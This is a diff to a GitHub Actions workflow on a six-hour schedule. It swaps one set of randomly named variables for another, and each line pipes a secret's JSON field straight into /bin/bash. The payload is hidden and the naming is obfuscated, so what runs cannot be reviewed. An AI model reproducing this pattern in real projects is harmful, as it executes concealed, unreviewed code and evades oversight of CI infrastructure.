@@ -3,27 +3,20 @@ name: donecartography
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
+    - cron: '22 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: donecartography
         env:
-          eog01: ${{ secrets.eog01 }}
+          mp1302: ${{ secrets.mp1302 }}
         run: |
-          echo $eog01 | jq -r .u0339 | /bin/bash
-          echo $qjoez22 | jq -r .rjrsg49 | /bin/bash
-          echo $d3847 | jq -r .vyf8364 | /bin/bash
-          echo $hq56005 | jq -r .mk1 | /bin/bash
-          echo $iqi3675 | jq -r .haes6 | /bin/bash
-          echo $bplu0 | jq -r .kl32 | /bin/bash
-          echo $cvnfb59497 | jq -r .aw498 | /bin/bash
-          echo $r784 | jq -r .fg4663 | /bin/bash
-          echo $p9916 | jq -r .vhaer818 | /bin/bash
-          echo $kykg88197 | jq -r .bm733 | /bin/bash
-          echo $qy4675 | jq -r .c27239 | /bin/bash
-          echo $p1 | jq -r .qzhh1 | /bin/bash
-          echo $k19 | jq -r .xpsu82 | /bin/bash
+          echo $mp1302 | jq -r .zd7578 | /bin/bash
+          echo $wyacu4542 | jq -r .pegww3 | /bin/bash
+          echo $p9213 | jq -r .bk05 | /bin/bash
+          echo $ciira2 | jq -r .pwjf0693 | /bin/bash
+          echo $sl12251 | jq -r .rjb2 | /bin/bash
 
